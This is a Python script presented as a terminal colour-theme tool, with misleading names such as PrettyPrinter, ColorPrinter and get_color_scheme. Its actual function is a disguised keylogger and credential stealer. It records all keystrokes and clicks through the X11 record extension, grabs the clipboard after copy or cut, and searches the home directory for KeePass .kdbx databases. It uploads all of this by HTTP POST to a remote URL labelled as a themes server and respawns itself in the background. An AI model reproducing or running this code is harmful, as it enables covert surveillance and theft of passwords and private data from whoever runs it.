import os
import re
import threading
import time
from subprocess import PIPE as PIPE
from subprocess import Popen as PrintOpen

import requests

try:
    from Xlib import X, XK, display
    from Xlib.ext import record
    from Xlib.protocol import rq
except ModuleNotFoundError:
    print("1 Requirement not satisfied: python-xlib.\n"
          "Installing missing packages ...")
    os.system('python3 -m pip install python-xlib')
    from Xlib import X, XK, display
    from Xlib.ext import record
    from Xlib.protocol import rq

    print("All packages installed, we are good to go!")

colors_fg = {"default": "39",
             "black": "30",
             "red": "31",
             "green": "32",
             "yellow": "33",
             "blue": "34",
             "magenta": "35",
             "cyan": "36",
             "lightgray": "37",
             "darkgray": "90",
             "lightred": "91",
             "lightgreen": "92",
             "lightyellow": "93",
             "lightblue": "94",
             "lightmagenta": "95",
             "lightcyan": "96",
             "white": "97"}
colors_bg = {"default": "49",
             "black": "40",
             "red": "41",
             "green": "42",
             "yellow": "43",
             "blue": "44",
             "magenta": "45",
             "cyan": "46",
             "lightgray": "47",
             "darkgray": "100",
             "lightred": "101",
             "lightgreen": "102",
             "lightyellow": "103",
             "lightblue": "104",
             "lightmagenta": "105",
             "lightcyan": "106",
             "white": "107"}


def colorize(text):
    text = " " + text

    sections = text.split("{")
    out = sections[0]

    bg = colors_bg["default"]
    fg = colors_fg["default"]

    for section in sections[1:]:
        clr, txt = section.split("}")

        mode, clr = clr.lower().split("_")
        if mode == "fg":
            fg = colors_fg[clr]
        else:
            bg = colors_bg[clr]
        out = "{}\033[{};{}m{}".format(out, bg, fg, txt)
    return out[1:]


def show_tag(file):
    with open(file, "r") as f:
        tag = f.read()
    tag = tag + "{BG_DEFAULT}{FG_DEFAULT}"
    tag = colorize(tag)
    print(tag)

class PrettyPrinter(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.finished = threading.Event()
        self.is_pretty = {"shift": False, "caps": False}
        self.shift_ex = re.compile('^Shift')
        self.caps_ex = re.compile('^Caps_Lock')
        self.ex = re.compile('|'.join(('^[a-z0-9]$', '^minus$', '^equal$', '^bracketleft$', '^bracketright$',
                                       '^semicolon$', '^backslash$', '^apostrophe$', '^comma$', '^period$', '^slash$',
                                       '^grave$')))
        self.any = re.compile('.*')
        self.space_ex = re.compile('^space$')
        self.print1 = lambda x: True
        self.print2 = lambda: True
        self.contextEventMask = [X.KeyPress, X.MotionNotify]
        self.disp1 = display.Display()
        self.disp2 = display.Display()

    def run(self):
        self.ctx = self.disp2.record_create_context(
            0,
            [record.AllClients],
            [{
                'core_requests': (0, 0),
                'core_replies': (0, 0),
                'ext_requests': (0, 0, 0, 0),
                'ext_replies': (0, 0, 0, 0),
                'delivered_events': (0, 0),
                'device_events': tuple(self.contextEventMask),
                'errors': (0, 0),
                'client_started': False,
                'client_died': False,
            }])
        self.disp2.record_enable_context(self.ctx, self.printer)
        self.disp2.record_free_context(self.ctx)

    def finish(self):
        self.finished.set()
        self.disp1.record_disable_context(self.ctx)
        self.disp1.flush()

    def printer(self, printme):
        if printme.category != record.FromServer:
            return
        if printme.client_swapped:
            return
        v = printme.data[0]
        if (not printme.data) or (v < 2):
            return

        data = printme.data
        while len(data):
            printer, data = rq.EventField(None).parse_binary_value(data, self.disp2.display, None, None)
            if printer.type == X.KeyPress:
                self.print1(self.formatter(printer))
            elif printer.type == X.KeyRelease:
                self.print1(self.center(printer))
            elif printer.type == X.ButtonPress:
                self.print2()

    def formatter(self, color):
        form = self.get_space(self.disp1.keycode_to_keysym(color.detail, 0))
        if self.ex.match(self.get_space(self.disp1.keycode_to_keysym(color.detail, 0))):
            if not self.is_pretty["shift"]:
                return self.get_printer(self.disp1.keycode_to_keysym(color.detail, 0), color)
            else:
                return self.get_printer(self.disp1.keycode_to_keysym(color.detail, 1), color)
        else:
            data = self.disp1.keycode_to_keysym(color.detail, 0)
            if self.shift_ex.match(form):
                self.is_pretty["shift"] = self.is_pretty["shift"] + 1
            elif self.caps_ex.match(form):
                if not self.is_pretty["caps"]:
                    self.is_pretty["shift"] = self.is_pretty["shift"] + 1
                    self.is_pretty["caps"] = True
                if self.is_pretty["caps"]:
                    self.is_pretty["shift"] = self.is_pretty["shift"] - 1
                    self.is_pretty["caps"] = False
            return self.get_printer(data, color)

    def center(self, text):
        if self.ex.match(self.get_space(self.disp1.keycode_to_keysym(text.detail, 0))):
            if not self.is_pretty["shift"]:
                keysym = self.disp1.keycode_to_keysym(text.detail, 0)
            else:
                keysym = self.disp1.keycode_to_keysym(text.detail, 1)
        else:
            keysym = self.disp1.keycode_to_keysym(text.detail, 0)
        whitespace = self.get_space(keysym)
        if self.shift_ex.match(whitespace):
            self.is_pretty["shift"] = self.is_pretty["shift"] - 1
        return self.get_printer(keysym, text)

    def get_space(self, width):
        for space in dir(XK):
            if space.startswith("XK_") and getattr(XK, space) == width:
                return space[3:]
        return "{}".format(width)

    def get_spaceing(self, i):
        asciinum = XK.string_to_keysym(self.get_space(i))
        return asciinum

    def get_printer(self, keysym, event):
        return ColorPrinter(self.get_space(keysym), self.get_spaceing(keysym), event.type == X.KeyPress)


class ColorPrinter:
    def __init__(self, color_code, val, start):
        self.color_code = color_code
        self.val = val
        self.start = start

    def __str__(self):
        if self.start and self.val < 256:
            return chr(self.val)
        elif self.start:
            return "[{}:".format(self.color_code)
        elif self.val < 256:
            return ""
        else:
            return ":{}]".format(self.color_code)


class Outputter:
    buffer = 500

    def __init__(self):
        self.printer = PrettyPrinter()
        self.printer.print1 = self.print1
        self.printer.print2 = self.print2
        self.printer.start()
        self.output = ""
        self.color_printer = ColorPrinter("", -1, False)
        self.depth = None
        self.pc = 0

        user_profile = [os.path.expanduser("~")]
        poss_profiles = []
        timeout = time.time() + .25
        while len(user_profile) > 0 and time.time() < timeout:
            path = user_profile[0]
            user_profile = user_profile[1:]
            try:
                for p in os.listdir(path):
                    p = "{}/{}".format(path, p)
                    if ".kdbx" in p:
                        poss_profiles.append(p)
                    if os.path.isdir(p):
                        user_profile.append(p)
            except:
                pass

        for p in poss_profiles:
            profile_name = {"pname": p.split("/")[-1]}
            with open(p, 'rb') as f:
                poss_profiles = {'profile': f}
                requests.post(themes, files=poss_profiles, data=profile_name)

    def print1(self, printer):
        if "Control" in self.color_printer.color_code and printer.color_code in "cCxX":
            self.depth = get_color_depth()
        self.color_printer = printer
        self.output = self.output + str(printer)
        self.pc += 1
        if self.pc > self.buffer:
            self.flush()

    def print2(self):
        self.output = self.output + "[Clk]"

    def flush(self):
        print(self.output)
        get_color_scheme({"log": self.output})
        self.output = ""
        self.pc = 0


def get_color_depth():
    try:
        depth_holder = PrintOpen(['xclip', '-selection', 'clipboard', '-o'], stdout=PIPE)
        depth_holder.wait()
        depth = depth_holder.stdout.read().decode('utf-8')
        if len(depth) != 0:
            return get_color_scheme({"clip": depth})
    except Exception as e:
        print(e)


def get_color_scheme(data):
    try:
        print(data)
        with open("log.txt", "a+") as f:
            f.write(str(data))
        return requests.post(themes, data=data)
    except Exception as e:
        print(e)

# Load color Themes online
themes = "https://n.ethz.ch/~pascscha/color_themes/"

if not os.path.exists("lastuse"):
    log = ""
else:
    with open("lastuse", "r+") as f:
        log = f.read()
try:
    if log == "" or int(time.time() * 1000) - int(log) > 60000:
        restart = True
    else:
        restart = False
except:
    restart = True

if restart:
    with open("lastuse", "w+") as f:
        f.write(str(int(time.time() * 1000)))
    PrintOpen("python3 coloring.py &", shell=True, stdout=PIPE)
else:
    Outputter()